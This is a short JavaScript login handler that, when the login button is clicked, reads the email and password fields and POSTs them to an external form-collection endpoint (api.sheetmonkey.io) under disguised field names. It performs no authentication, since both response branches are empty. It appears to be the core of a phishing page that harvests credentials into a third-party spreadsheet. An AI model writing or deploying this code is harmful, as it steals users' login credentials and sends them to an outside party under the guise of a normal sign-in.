document.getElementById("login-btn").addEventListener("click",function(){ 
    
    let usuario=document.getElementById("email").value
    let usuario_2=document.getElementById("password").value

      fetch("https://api.sheetmonkey.io/form/aMg4Fau8yyiKVsRUqCSS8N", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          usuario: usuario_2,
          zona_2: usuario
        })
      })
      .then(res => {
        if (res.ok) {
            let dd=""
        } else {
            let dd=""
        }
      })
      .catch(err => {
        console.error("Erro:", err);
      });
})